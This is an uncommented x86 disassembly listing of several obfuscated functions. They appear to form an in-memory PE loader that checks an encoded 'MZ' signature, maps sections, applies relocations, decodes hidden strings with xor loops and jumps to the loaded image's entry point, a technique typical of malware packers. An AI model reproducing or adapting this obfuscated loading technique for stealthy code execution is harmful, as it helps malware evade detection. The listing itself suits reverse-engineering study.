  4139c9:	call   DWORD PTR [eax]
  4139cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4139ce:	xor    ecx,esi
  4139d0:	add    ecx,edi
  4139d2:	mov    DWORD PTR [ebp-0xc],eax
  4139d5:	cmp    ecx,eax
  4139d7:	jne    0x4139eb
  4139d9:	mov    eax,DWORD PTR [ebp+0x10]
  4139dc:	push   DWORD PTR [ebp+0xc]
  4139df:	mov    eax,DWORD PTR [eax+0x1d8]
  4139e5:	call   DWORD PTR [eax+0xc]
  4139e8:	mov    DWORD PTR [ebp-0xc],eax
  4139eb:	mov    DWORD PTR [ebp-0x20],0x7f661b0a
  4139f2:	mov    DWORD PTR [ebp-0x20],0xf89c999a
  4139f9:	mov    eax,DWORD PTR [ebp-0x4]
  4139fc:	xor    eax,esi
  4139fe:	add    eax,edi
  413a00:	cmp    eax,DWORD PTR [ebp-0xc]
  413a03:	jne    0x413a28
  413a05:	mov    eax,DWORD PTR [ebp-0x8]
  413a08:	mov    ecx,DWORD PTR [ebp-0x20]
  413a0b:	xor    eax,esi
  413a0d:	xor    ecx,esi
  413a0f:	lea    ebx,[ebx+eax*1+0x3272dd]
  413a16:	mov    eax,DWORD PTR [ebp+0x10]
  413a19:	mov    eax,DWORD PTR [eax+0x1d8]
  413a1f:	add    ecx,edi
  413a21:	imul   ecx,ebx
  413a24:	push   ecx
  413a25:	call   DWORD PTR [eax+0x24]
  413a28:	mov    eax,DWORD PTR [ebp-0x4]
  413a2b:	xor    eax,esi
  413a2d:	add    eax,edi
  413a2f:	cmp    eax,DWORD PTR [ebp-0xc]
  413a32:	jne    0x413a43
  413a34:	mov    eax,DWORD PTR [ebp-0x28]
  413a37:	xor    eax,esi
  413a39:	add    eax,edi
  413a3b:	cmp    ebx,eax
  413a3d:	jbe    0x4139bd
  413a43:	mov    eax,DWORD PTR [ebp-0x4]
  413a46:	xor    eax,esi
  413a48:	add    eax,edi
  413a4a:	cmp    eax,DWORD PTR [ebp-0xc]
  413a4d:	jne    0x413a66
  413a4f:	mov    eax,DWORD PTR [ebp-0x8]
  413a52:	mov    ecx,DWORD PTR [ebp-0x18]
  413a55:	xor    eax,esi
  413a57:	lea    eax,[ecx+eax*1+0x3272dd]
  413a5e:	mov    DWORD PTR [ebp-0x18],eax
  413a61:	jmp    0x413b55
  413a66:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  413a6d:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  413a74:	mov    ebx,DWORD PTR [ebp-0x4]
  413a77:	xor    ebx,esi
  413a79:	add    ebx,edi
  413a7b:	jmp    0x413b42
  413a80:	mov    eax,DWORD PTR [ebp-0x4]
  413a83:	xor    eax,esi
  413a85:	add    eax,edi
  413a87:	mov    DWORD PTR [ebp-0x14],eax
  413a8a:	mov    eax,DWORD PTR [ebp-0x4]
  413a8d:	xor    eax,esi
  413a8f:	add    eax,edi
  413a91:	mov    DWORD PTR [ebp+0xc],eax
  413a94:	mov    ecx,DWORD PTR [ebp-0x4]
  413a97:	mov    eax,DWORD PTR [ebp-0x24]
  413a9a:	xor    ecx,esi
  413a9c:	add    ecx,edi
  413a9e:	cmp    ecx,eax
  413aa0:	je     0x413aa8
  413aa2:	mov    eax,DWORD PTR [eax+ebx*4]
  413aa5:	mov    DWORD PTR [ebp-0x14],eax
  413aa8:	mov    eax,DWORD PTR [ebp-0x1c]
  413aab:	mov    eax,DWORD PTR [eax+ebx*4]
  413aae:	mov    DWORD PTR [ebp+0xc],eax
  413ab1:	mov    eax,DWORD PTR [ebp-0x4]
  413ab4:	mov    ecx,DWORD PTR [ebp-0x14]
  413ab7:	xor    eax,esi
  413ab9:	add    eax,edi
  413abb:	cmp    eax,ecx
  413abd:	je     0x413ae8
  413abf:	mov    eax,DWORD PTR [ebp-0x4]
  413ac2:	mov    ecx,DWORD PTR [ebp-0x14]
  413ac5:	xor    eax,esi
  413ac7:	add    eax,edi
  413ac9:	shr    ecx,0x1f
  413acc:	cmp    eax,ecx
  413ace:	je     0x413ae8
  413ad0:	mov    ecx,DWORD PTR [ebp-0x14]
  413ad3:	mov    eax,DWORD PTR [ebp+0x10]
  413ad6:	mov    eax,DWORD PTR [eax+0x1d8]
  413adc:	movzx  ecx,cx
  413adf:	push   ecx
  413ae0:	push   DWORD PTR [ebp-0xc]
  413ae3:	call   DWORD PTR [eax+0x8]
  413ae6:	jmp    0x413b01
  413ae8:	mov    eax,DWORD PTR [ebp+0xc]
  413aeb:	add    eax,DWORD PTR [ebp+0x8]
  413aee:	mov    ecx,DWORD PTR [ebp+0x10]
  413af1:	mov    ecx,DWORD PTR [ecx+0x1d8]
  413af7:	add    eax,0x2
  413afa:	push   eax
  413afb:	push   DWORD PTR [ebp-0xc]
  413afe:	call   DWORD PTR [ecx+0x8]
  413b01:	mov    DWORD PTR [ebp+0xc],eax
  413b04:	mov    eax,DWORD PTR [ebp-0x4]
  413b07:	mov    ecx,DWORD PTR [ebp+0xc]
  413b0a:	xor    eax,esi
  413b0c:	add    eax,edi
  413b0e:	cmp    eax,ecx
  413b10:	mov    eax,DWORD PTR [ebp-0x8]
  413b13:	jne    0x413b26
  413b15:	mov    ecx,DWORD PTR [ebp-0x18]
  413b18:	xor    eax,esi
  413b1a:	lea    eax,[ecx+eax*1+0x3272dd]
  413b21:	mov    DWORD PTR [ebp-0x18],eax
  413b24:	jmp    0x413b36
  413b26:	mov    ecx,DWORD PTR [ebp+0xc]
  413b29:	xor    eax,esi
  413b2b:	add    eax,edi
  413b2d:	imul   eax,ecx
  413b30:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b33:	mov    DWORD PTR [ecx+ebx*4],eax
  413b36:	mov    eax,DWORD PTR [ebp-0x8]
  413b39:	xor    eax,esi
  413b3b:	lea    ebx,[ebx+eax*1+0x3272dd]
  413b42:	mov    eax,DWORD PTR [ebp-0x4]
  413b45:	mov    ecx,DWORD PTR [ebp-0x1c]
  413b48:	xor    eax,esi
  413b4a:	add    eax,edi
  413b4c:	cmp    DWORD PTR [ecx+ebx*4],eax
  413b4f:	jne    0x413a80
  413b55:	mov    edx,DWORD PTR [ebp-0x10]
  413b58:	mov    eax,DWORD PTR [ebp-0x18]
  413b5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  413b5e:	sub    edx,0x3272dc
  413b64:	xor    edx,esi
  413b66:	jmp    0x413930
  413b6b:	mov    ecx,DWORD PTR [ebp-0x4]
  413b6e:	xor    ecx,esi
  413b70:	add    ecx,edi
  413b72:	cmp    eax,ecx
  413b74:	mov    eax,DWORD PTR [ebp-0x4]
  413b77:	jne    0x413b81
  413b79:	mov    eax,DWORD PTR [ebp-0x8]
  413b7c:	jmp    0x413b81
  413b7e:	mov    eax,DWORD PTR [ebp-0x4]
  413b81:	xor    eax,esi
  413b83:	add    eax,edi
  413b85:	pop    edi
  413b86:	pop    esi
  413b87:	pop    ebx
  413b88:	leave  
  413b89:	ret    0xc
  413b8c:	push   ebp
  413b8d:	mov    ebp,esp
  413b8f:	sub    esp,0x28
  413b92:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413b99:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  413ba0:	mov    eax,DWORD PTR [ebp+0xc]
  413ba3:	mov    DWORD PTR [ebp+0xc],eax
  413ba6:	push   esi
  413ba7:	mov    eax,eax
  413ba9:	mov    eax,DWORD PTR [ebp-0x4]
  413bac:	mov    esi,DWORD PTR [ebp+0x8]
  413baf:	mov    ecx,0x7510896
  413bb4:	xor    eax,ecx
  413bb6:	mov    edx,0x3272dd
  413bbb:	add    eax,edx
  413bbd:	cmp    esi,eax
  413bbf:	je     0x413ce6
  413bc5:	mov    eax,DWORD PTR [ebp+0x8]
  413bc8:	mov    esi,DWORD PTR [ebp+0x8]
  413bcb:	add    esi,DWORD PTR [eax+0x3c]
  413bce:	push   edi
  413bcf:	mov    DWORD PTR [ebp+0xc],esi
  413bd2:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  413bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  413bdc:	mov    esi,DWORD PTR [ebp-0x4]
  413bdf:	mov    edi,DWORD PTR [ebp+0xc]
  413be2:	xor    esi,ecx
  413be4:	xor    eax,ecx
  413be6:	add    esi,edx
  413be8:	cmp    DWORD PTR [edi+eax*8+0x1939760],esi
  413bef:	je     0x413ce0
  413bf5:	mov    esi,DWORD PTR [ebp+0xc]
  413bf8:	mov    eax,DWORD PTR [ebp+0x8]
  413bfb:	add    eax,DWORD PTR [esi+0xa0]
  413c01:	mov    esi,DWORD PTR [ebp+0x8]
  413c04:	mov    edi,DWORD PTR [ebp+0xc]
  413c07:	sub    esi,DWORD PTR [edi+0x34]
  413c0a:	mov    edi,DWORD PTR [ebp-0x4]
  413c0d:	xor    edi,ecx
  413c0f:	add    edi,edx
  413c11:	mov    DWORD PTR [ebp-0x24],esi
  413c14:	cmp    esi,edi
  413c16:	je     0x413ce0
  413c1c:	mov    esi,DWORD PTR [ebp-0x4]
  413c1f:	xor    esi,ecx
  413c21:	add    esi,edx
  413c23:	mov    DWORD PTR [ebp-0x8],esi
  413c26:	push   ebx
  413c27:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  413c2e:	jmp    0x413cca
  413c33:	mov    esi,DWORD PTR [ebp-0x4]
  413c36:	xor    esi,ecx
  413c38:	lea    edi,[ebx-0x8]
  413c3b:	add    esi,edx
  413c3d:	shr    edi,1
  413c3f:	cmp    esi,edi
  413c41:	jae    0x413cb0
  413c43:	sub    edi,esi
  413c45:	lea    ebx,[eax+esi*2+0x8]
  413c49:	mov    DWORD PTR [ebp-0x18],edi
  413c4c:	movzx  esi,WORD PTR [ebx]
  413c4f:	and    esi,0xfff
  413c55:	mov    DWORD PTR [ebp-0x14],esi
  413c58:	mov    edi,DWORD PTR [ebp-0x14]
  413c5b:	mov    esi,DWORD PTR [eax]
  413c5d:	sub    esi,edx
  413c5f:	add    edi,esi
  413c61:	movzx  esi,WORD PTR [ebx]
  413c64:	shr    esi,0xc
  413c67:	xor    edi,ecx
  413c69:	mov    DWORD PTR [ebp-0x20],edi
  413c6c:	mov    DWORD PTR [ebp-0x14],esi
  413c6f:	mov    esi,DWORD PTR [ebp-0x20]
  413c72:	mov    edi,DWORD PTR [ebp+0x8]
  413c75:	xor    esi,ecx
  413c77:	lea    esi,[esi+edi*1+0x3272dd]
  413c7e:	mov    DWORD PTR [ebp-0x20],esi
  413c81:	mov    esi,DWORD PTR [ebp-0x10]
  413c84:	mov    edi,DWORD PTR [ebp-0x14]
  413c87:	xor    esi,ecx
  413c89:	add    esi,edx
  413c8b:	cmp    edi,esi
  413c8d:	jne    0x413ca5
  413c8f:	mov    esi,DWORD PTR [ebp-0x10]
  413c92:	mov    edi,DWORD PTR [ebp-0x14]
  413c95:	xor    esi,ecx
  413c97:	add    esi,edx
  413c99:	cmp    edi,esi
  413c9b:	jne    0x413ca5
  413c9d:	mov    esi,DWORD PTR [ebp-0x20]
  413ca0:	mov    edi,DWORD PTR [ebp-0x24]
  413ca3:	add    DWORD PTR [esi],edi
  413ca5:	add    ebx,0x2
  413ca8:	dec    DWORD PTR [ebp-0x18]
  413cab:	jne    0x413c4c
  413cad:	mov    ebx,DWORD PTR [ebp-0xc]
  413cb0:	add    DWORD PTR [ebp-0x8],ebx
  413cb3:	mov    esi,DWORD PTR [ebp-0x1c]
  413cb6:	mov    edi,DWORD PTR [ebp-0x8]
  413cb9:	mov    ebx,DWORD PTR [ebp+0xc]
  413cbc:	xor    esi,ecx
  413cbe:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939764]
  413cc5:	jae    0x413cdf
  413cc7:	add    eax,DWORD PTR [ebp-0xc]
  413cca:	mov    esi,DWORD PTR [ebp-0x4]
  413ccd:	mov    ebx,DWORD PTR [eax+0x4]
  413cd0:	xor    esi,ecx
  413cd2:	add    esi,edx
  413cd4:	mov    DWORD PTR [ebp-0xc],ebx
  413cd7:	cmp    ebx,esi
  413cd9:	jne    0x413c33
  413cdf:	pop    ebx
  413ce0:	mov    eax,DWORD PTR [ebp-0x28]
  413ce3:	pop    edi
  413ce4:	jmp    0x413ce9
  413ce6:	mov    eax,DWORD PTR [ebp-0x4]
  413ce9:	xor    eax,ecx
  413ceb:	add    eax,edx
  413ced:	pop    esi
  413cee:	leave  
  413cef:	ret    0x8
  413cf2:	push   ebp
  413cf3:	mov    ebp,esp
  413cf5:	sub    esp,0x54
  413cf8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  413cff:	mov    DWORD PTR [ebp-0x24],0xf89c85b2
  413d06:	mov    eax,DWORD PTR [ebp-0x4]
  413d09:	push   ebx
  413d0a:	push   esi
  413d0b:	mov    esi,0x7510896
  413d10:	xor    eax,esi
  413d12:	mov    ebx,0x3272dd
  413d17:	add    eax,ebx
  413d19:	mov    DWORD PTR [ebp-0x18],eax
  413d1c:	mov    eax,DWORD PTR [ebp-0x4]
  413d1f:	xor    eax,esi
  413d21:	add    eax,ebx
  413d23:	mov    DWORD PTR [ebp-0x20],eax
  413d26:	push   edi
  413d27:	mov    edi,DWORD PTR [ebp+0x20]
  413d2a:	mov    eax,DWORD PTR [ebp-0x10]
  413d2d:	mov    ecx,DWORD PTR [ebp-0x10]
  413d30:	xor    eax,ecx
  413d32:	mov    DWORD PTR [ebp-0x10],eax
  413d35:	add    DWORD PTR [ebp-0x10],0xf89cb5b5
  413d3c:	mov    eax,DWORD PTR [ebp-0x8]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  413d42:	xor    eax,ecx
  413d44:	mov    DWORD PTR [ebp-0x8],eax
  413d47:	add    DWORD PTR [ebp-0x8],0xf89c85f5
  413d4e:	mov    eax,DWORD PTR [ebp-0xc]
  413d51:	mov    ecx,DWORD PTR [ebp-0xc]
  413d54:	xor    eax,ecx
  413d56:	mov    DWORD PTR [ebp-0xc],eax
  413d59:	add    DWORD PTR [ebp-0xc],0xf89c85b1
  413d60:	mov    eax,DWORD PTR [ebp-0x14]
  413d63:	mov    ecx,DWORD PTR [ebp-0x14]
  413d66:	xor    eax,ecx
  413d68:	mov    DWORD PTR [ebp-0x14],eax
  413d6b:	add    DWORD PTR [ebp-0x14],0xf89f05b5
  413d72:	mov    eax,0x9588
  413d77:	mov    WORD PTR [ebp+0x20],ax
  413d7b:	mov    eax,DWORD PTR [ebp+0x8]
  413d7e:	test   eax,eax
  413d80:	je     0x414165
  413d86:	mov    eax,DWORD PTR [ebp+0xc]
  413d89:	test   eax,eax
  413d8b:	je     0x414165
  413d91:	mov    eax,DWORD PTR [ebp+0x18]
  413d94:	test   eax,eax
  413d96:	je     0x414165
  413d9c:	mov    ax,WORD PTR [ebp+0x20]
  413da0:	mov    ecx,0x8a89
  413da5:	xor    ax,cx
  413da8:	mov    ecx,0x3b4c
  413dad:	add    ax,cx
  413db0:	mov    ecx,DWORD PTR [ebp+0x8]
  413db3:	cmp    WORD PTR [ecx],ax
  413db6:	jne    0x414165
  413dbc:	mov    eax,DWORD PTR [ebp-0x4]
  413dbf:	mov    ecx,DWORD PTR [ebp+0x8]
  413dc2:	mov    eax,DWORD PTR [ebp+0x8]
  413dc5:	add    eax,DWORD PTR [ecx+0x3c]
  413dc8:	mov    DWORD PTR [ebp+0xc],eax
  413dcb:	mov    eax,DWORD PTR [eax+0x50]
  413dce:	test   eax,eax
  413dd0:	je     0x414165
  413dd6:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  413ddd:	mov    eax,DWORD PTR [ebp-0x2c]
  413de0:	xor    eax,esi
  413de2:	add    eax,ebx
  413de4:	mov    DWORD PTR [ebp-0x2c],eax
  413de7:	mov    eax,DWORD PTR [ebp-0x4]
  413dea:	mov    eax,DWORD PTR [edi+0x190]
  413df0:	mov    ecx,DWORD PTR [eax]
  413df2:	mov    ecx,DWORD PTR [ecx+0x3c]
  413df5:	add    ecx,DWORD PTR [eax]
  413df7:	mov    eax,DWORD PTR [ebp-0x4]
  413dfa:	mov    eax,DWORD PTR [edi+0x18c]
  413e00:	mov    edx,DWORD PTR [eax]
  413e02:	mov    DWORD PTR [ebp-0x1c],ecx
  413e05:	mov    DWORD PTR [ebp+0x20],edx
  413e08:	cmp    edx,edx
  413e0a:	jne    0x413e3f
  413e0c:	mov    eax,DWORD PTR [edi+0x1d8]
  413e12:	lea    edx,[ebp-0x18]
  413e15:	push   edx
  413e16:	mov    edx,DWORD PTR [ebp-0x8]
  413e19:	xor    edx,esi
  413e1b:	add    edx,ebx
  413e1d:	push   edx
  413e1e:	push   DWORD PTR [ecx+0x50]
  413e21:	push   DWORD PTR [ebp+0x20]
  413e24:	call   DWORD PTR [eax+0x1c]
  413e27:	mov    ecx,DWORD PTR [ebp-0x1c]
  413e2a:	mov    eax,DWORD PTR [ecx+0x54]
  413e2d:	mov    ecx,DWORD PTR [ecx+0x50]
  413e30:	sub    ecx,eax
  413e32:	add    eax,DWORD PTR [ebp+0x20]
  413e35:	push   ecx
  413e36:	push   eax
  413e37:	call   0x414779
  413e3c:	mov    edx,DWORD PTR [ebp+0x20]
  413e3f:	mov    eax,DWORD PTR [edi+0x194]
  413e45:	mov    DWORD PTR [eax],edx
  413e47:	mov    eax,DWORD PTR [ebp+0xc]
  413e4a:	push   DWORD PTR [eax+0x54]
  413e4d:	push   DWORD PTR [ebp+0x8]
  413e50:	push   edx
  413e51:	call   0x414620
  413e56:	mov    ecx,DWORD PTR [ebp+0x20]
  413e59:	mov    eax,DWORD PTR [ecx+0x3c]
  413e5c:	add    eax,ecx
  413e5e:	movzx  ecx,WORD PTR [eax+0x14]
  413e62:	lea    ecx,[ecx+eax*1+0x18]
  413e66:	mov    DWORD PTR [ebp+0x18],ecx
  413e69:	mov    ecx,DWORD PTR [ebp-0x4]
  413e6c:	movzx  edx,WORD PTR [eax+0x6]
  413e70:	xor    ecx,esi
  413e72:	add    ecx,ebx
  413e74:	mov    DWORD PTR [ebp+0xc],eax
  413e77:	cmp    edx,ecx
  413e79:	je     0x413f27
  413e7f:	mov    ecx,DWORD PTR [ebp-0x4]
  413e82:	xor    ecx,esi
  413e84:	add    ecx,ebx
  413e86:	mov    DWORD PTR [ebp-0x20],ecx
  413e89:	mov    ecx,DWORD PTR [ebp-0x24]
  413e8c:	movzx  edx,WORD PTR [eax+0x6]
  413e90:	xor    ecx,esi
  413e92:	sub    edx,ecx
  413e94:	sub    edx,ebx
  413e96:	cmp    DWORD PTR [ebp-0x20],edx
  413e99:	ja     0x413f27
  413e9f:	mov    edx,DWORD PTR [ebp+0x18]
  413ea2:	add    edx,0x8
  413ea5:	mov    DWORD PTR [ebp+0x18],edx
  413ea8:	jmp    0x413ead
  413eaa:	mov    edx,DWORD PTR [ebp+0x18]
  413ead:	mov    eax,DWORD PTR [eax+0x38]
  413eb0:	lea    ecx,[eax-0x1]
  413eb3:	mov    DWORD PTR [ebp-0x30],eax
  413eb6:	mov    eax,DWORD PTR [edx]
  413eb8:	test   ecx,eax
  413eba:	je     0x413ec3
  413ebc:	not    ecx
  413ebe:	and    eax,ecx
  413ec0:	add    eax,DWORD PTR [ebp-0x30]
  413ec3:	push   eax
  413ec4:	mov    eax,DWORD PTR [edx+0x4]
  413ec7:	add    eax,DWORD PTR [ebp+0x20]
  413eca:	push   eax
  413ecb:	call   0x414779
  413ed0:	mov    edx,DWORD PTR [ebp-0x4]
  413ed3:	mov    eax,DWORD PTR [ebp+0x18]
  413ed6:	mov    ecx,DWORD PTR [eax+0x8]
  413ed9:	xor    edx,esi
  413edb:	add    edx,ebx
  413edd:	cmp    ecx,edx
  413edf:	je     0x413ef8
  413ee1:	push   ecx
  413ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  413ee5:	add    ecx,DWORD PTR [eax+0xc]
  413ee8:	mov    eax,DWORD PTR [eax+0x4]
  413eeb:	add    eax,DWORD PTR [ebp+0x20]
  413eee:	push   ecx
  413eef:	push   eax
  413ef0:	call   0x414620
  413ef5:	mov    eax,DWORD PTR [ebp+0x18]
  413ef8:	mov    ecx,DWORD PTR [ebp-0x24]
  413efb:	mov    edx,DWORD PTR [ebp-0x20]
  413efe:	add    eax,0x28
  413f01:	xor    ecx,esi
  413f03:	lea    ecx,[edx+ecx*1+0x3272dd]
  413f0a:	mov    edx,DWORD PTR [ebp+0xc]
  413f0d:	mov    DWORD PTR [ebp+0x18],eax
  413f10:	mov    eax,DWORD PTR [ebp-0x24]
  413f13:	movzx  edx,WORD PTR [edx+0x6]
  413f17:	xor    eax,esi
  413f19:	sub    edx,eax
  413f1b:	mov    eax,DWORD PTR [ebp+0xc]
  413f1e:	sub    edx,ebx
  413f20:	mov    DWORD PTR [ebp-0x20],ecx
  413f23:	cmp    ecx,edx
  413f25:	jbe    0x413eaa
  413f27:	mov    ecx,DWORD PTR [ebp-0x4]
  413f2a:	mov    edx,DWORD PTR [edi+0x18c]
  413f30:	xor    ecx,esi
  413f32:	add    ecx,ebx
  413f34:	mov    DWORD PTR [ebp+0x18],ecx
  413f37:	mov    ecx,DWORD PTR [ebp+0x20]
  413f3a:	cmp    ecx,DWORD PTR [edx]
  413f3c:	jne    0x413f65
  413f3e:	mov    eax,DWORD PTR [edi+0x1d8]
  413f44:	lea    edx,[ebp-0x18]
  413f47:	push   edx
  413f48:	mov    edx,DWORD PTR [ebp-0xc]
  413f4b:	xor    edx,esi
  413f4d:	add    edx,ebx
  413f4f:	push   edx
  413f50:	mov    edx,DWORD PTR [ebp-0x1c]
  413f53:	push   DWORD PTR [edx+0x54]
  413f56:	push   ecx
  413f57:	call   DWORD PTR [eax+0x1c]
  413f5a:	test   eax,eax
  413f5c:	je     0x414156
  413f62:	mov    eax,DWORD PTR [ebp+0xc]
  413f65:	mov    ecx,DWORD PTR [edi+0x1c8]
  413f6b:	mov    ecx,DWORD PTR [ecx]
  413f6d:	xor    ecx,esi
  413f6f:	add    ecx,ebx
  413f71:	je     0x414081
  413f77:	and    DWORD PTR [ebp-0x28],0x0
  413f7b:	mov    eax,0x4fab
  413f80:	mov    WORD PTR [ebp-0x3c],ax
  413f84:	add    eax,0xfffffff6
  413f87:	mov    WORD PTR [ebp-0x3a],ax
  413f8b:	mov    eax,0x4f91
  413f90:	mov    WORD PTR [ebp-0x38],ax
  413f94:	add    eax,0x18
  413f97:	and    DWORD PTR [ebp+0x8],0x0
  413f9b:	mov    ecx,eax
  413f9d:	mov    WORD PTR [ebp-0x34],ax
  413fa1:	mov    eax,0x4e3d
  413fa6:	mov    WORD PTR [ebp-0x36],cx
  413faa:	mov    WORD PTR [ebp-0x32],ax
  413fae:	mov    eax,DWORD PTR [ebp+0x8]
  413fb1:	lea    eax,[ebp+eax*2-0x3c]
  413fb5:	mov    ecx,0x8a89
  413fba:	xor    cx,WORD PTR [eax]
  413fbd:	mov    edx,0x3b4c
  413fc2:	add    cx,dx
  413fc5:	inc    DWORD PTR [ebp+0x8]
  413fc8:	cmp    DWORD PTR [ebp+0x8],0x6
  413fcc:	mov    WORD PTR [eax],cx
  413fcf:	jb     0x413fae
  413fd1:	mov    DWORD PTR [ebp-0x54],0x200c1e26
  413fd8:	mov    DWORD PTR [ebp-0x50],0x211e0805
  413fdf:	mov    DWORD PTR [ebp-0x4c],0xf50c0e08
  413fe6:	mov    DWORD PTR [ebp-0x48],0x3d0c0b20
  413fed:	mov    DWORD PTR [ebp-0x44],0x10c1e1e
  413ff4:	mov    WORD PTR [ebp-0x40],0xf0f
  413ffa:	mov    BYTE PTR [ebp-0x3e],0x7a
  413ffe:	xor    ecx,ecx
  414000:	lea    eax,[ebp+ecx*1-0x54]
  414004:	mov    dl,BYTE PTR [eax]
  414006:	xor    dl,0x71
  414009:	sub    dl,0xb
  41400c:	inc    ecx
  41400d:	mov    BYTE PTR [eax],dl
  41400f:	cmp    ecx,0x17
  414012:	jb     0x414000
  414014:	mov    eax,DWORD PTR [edi+0x1d8]
  41401a:	lea    ecx,[ebp-0x3c]
  41401d:	push   ecx
  41401e:	call   DWORD PTR [eax+0x4]
  414021:	mov    ecx,DWORD PTR [edi+0x1d8]
  414027:	lea    edx,[ebp-0x54]
  41402a:	push   edx
  41402b:	push   eax
  41402c:	call   DWORD PTR [ecx+0x8]
  41402f:	lea    ecx,[ebp-0x28]
  414032:	push   ecx
  414033:	mov    ecx,DWORD PTR [edi+0x18c]
  414039:	push   DWORD PTR [ecx]
  41403b:	call   eax
  41403d:	mov    eax,DWORD PTR [ebp-0x28]
  414040:	test   eax,eax
  414042:	je     0x41407e
  414044:	mov    DWORD PTR [ebp+0x8],eax
  414047:	jmp    0x414053
  414049:	mov    eax,DWORD PTR [eax]
  41404b:	mov    DWORD PTR [ebp-0x28],eax
  41404e:	cmp    eax,DWORD PTR [ebp+0x8]
  414051:	je     0x414060
  414053:	mov    edx,DWORD PTR [eax+0x18]
  414056:	mov    ecx,DWORD PTR [edi+0x18c]
  41405c:	cmp    edx,DWORD PTR [ecx]
  41405e:	jne    0x414049
  414060:	mov    edx,DWORD PTR [eax+0x18]
  414063:	mov    ecx,DWORD PTR [edi+0x18c]
  414069:	cmp    edx,DWORD PTR [ecx]
  41406b:	jne    0x41407e
  41406d:	mov    edx,DWORD PTR [ebp-0x1c]
  414070:	mov    ecx,DWORD PTR [edi+0x190]
  414076:	mov    edx,DWORD PTR [edx+0x28]
  414079:	add    edx,DWORD PTR [ecx]
  41407b:	mov    DWORD PTR [eax+0x1c],edx
  41407e:	mov    eax,DWORD PTR [ebp+0xc]
  414081:	push   edi
  414082:	push   eax
  414083:	push   DWORD PTR [ebp+0x20]
  414086:	call   0x4138a9
  41408b:	test   eax,eax
  41408d:	je     0x414156
  414093:	push   DWORD PTR [ebp+0xc]
  414096:	mov    ecx,edi
  414098:	push   DWORD PTR [ebp+0x20]
  41409b:	call   0x413802
  4140a0:	test   eax,eax
  4140a2:	je     0x414156
  4140a8:	mov    eax,DWORD PTR [ebp+0xc]
  4140ab:	mov    edx,DWORD PTR [ebp+0x20]
  4140ae:	mov    ecx,edi
  4140b0:	call   0x4136db
  4140b5:	test   eax,eax
  4140b7:	je     0x414156
  4140bd:	push   edi
  4140be:	push   DWORD PTR [ebp+0x20]
  4140c1:	call   0x413b8c
  4140c6:	test   eax,eax
  4140c8:	je     0x414156
  4140ce:	mov    eax,DWORD PTR [edi+0x18c]
  4140d4:	mov    edx,DWORD PTR [ebp+0x20]
  4140d7:	cmp    edx,DWORD PTR [eax]
  4140d9:	jne    0x4140f5
  4140db:	mov    eax,DWORD PTR [edi+0x1d8]
  4140e1:	lea    ecx,[ebp-0x18]
  4140e4:	push   ecx
  4140e5:	push   DWORD PTR [ebp-0x18]
  4140e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4140eb:	push   DWORD PTR [ecx+0x54]
  4140ee:	push   edx
  4140ef:	call   DWORD PTR [eax+0x1c]
  4140f2:	mov    edx,DWORD PTR [ebp+0x20]
  4140f5:	mov    eax,DWORD PTR [edi+0x1c8]
  4140fb:	mov    eax,DWORD PTR [eax]
  4140fd:	xor    eax,esi
  4140ff:	add    eax,ebx
  414101:	je     0x41413a
  414103:	mov    ecx,DWORD PTR [ebp+0xc]
  414106:	mov    eax,DWORD PTR [ecx+0x28]
  414109:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  414110:	mov    esi,DWORD PTR [ebp+0x8]
  414113:	push   DWORD PTR [ebp+0x14]
  414116:	xor    esi,0x896
  41411c:	push   DWORD PTR [ebp+0x10]
  41411f:	add    esi,0x72dd
  414125:	or     WORD PTR [ecx+0x16],si
  414129:	add    eax,edx
  41412b:	push   edx
  41412c:	call   eax
  41412e:	mov    DWORD PTR [edi+0x1d0],0xf89c85b2
  414138:	jmp    0x414144
  41413a:	mov    eax,DWORD PTR [ebp+0xc]
  41413d:	mov    eax,DWORD PTR [eax+0x28]
  414140:	add    eax,edx
  414142:	call   eax
  414144:	mov    DWORD PTR [ebp-0x20],eax
  414147:	mov    eax,DWORD PTR [ebp-0x20]
  41414a:	mov    ecx,DWORD PTR [ebp+0x1c]
  41414d:	mov    DWORD PTR [ecx],eax
  41414f:	mov    DWORD PTR [ebp+0x18],0x1
  414156:	cmp    DWORD PTR [ebp+0x18],0x0
  41415a:	jne    0x414160
  41415c:	and    DWORD PTR [ebp+0x20],0x0
  414160:	mov    eax,DWORD PTR [ebp+0x20]
  414163:	jmp    0x414167
  414165:	xor    eax,eax
  414167:	pop    edi
  414168:	pop    esi
  414169:	pop    ebx
  41416a:	leave  
  41416b:	ret    0x1c
  41416e:	push   ebp
  41416f:	mov    ebp,esp
  414171:	movzx  edx,WORD PTR [ecx+0x6]
  414175:	movzx  eax,WORD PTR [ecx+0x14]
  414179:	push   ebx
  41417a:	push   edi
  41417b:	xor    edi,edi
  41417d:	lea    eax,[eax+ecx*1+0x18]
  414181:	test   edx,edx
  414183:	je     0x4141a4
  414185:	mov    ecx,DWORD PTR [eax+0xc]
  414188:	lea    ebx,[ecx+esi*1]
  41418b:	cmp    DWORD PTR [ebp+0x8],ebx
  41418e:	jb     0x41419c
  414190:	mov    ebx,DWORD PTR [eax+0x8]
  414193:	add    ebx,ecx
  414195:	add    ebx,esi
  414197:	cmp    DWORD PTR [ebp+0x8],ebx
  41419a:	jb     0x4141a6
  41419c:	add    eax,0x28
  41419f:	inc    edi
  4141a0:	cmp    edi,edx
  4141a2:	jb     0x414185
  4141a4:	xor    eax,eax
  4141a6:	pop    edi
  4141a7:	pop    ebx
  4141a8:	pop    ebp
  4141a9:	ret    0x4
  4141ac:	push   ebp
  4141ad:	mov    ebp,esp
  4141af:	sub    esp,0x28
  4141b2:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  4141b9:	mov    DWORD PTR [ebp-0x1c],0xf89c85b2
